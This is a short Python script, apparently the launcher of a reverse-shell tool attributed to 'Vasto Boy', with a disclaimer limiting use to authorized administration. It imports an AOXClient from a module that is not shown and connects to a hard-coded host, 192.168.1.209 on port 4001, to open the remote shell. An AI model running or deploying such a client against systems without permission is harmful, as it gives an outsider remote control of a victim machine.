# Created by Vasto Boy

# Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

from aox_client import AOXClient


aox_client = AOXClient("192.168.1.209", 4001)
aox_client.establish_connection()
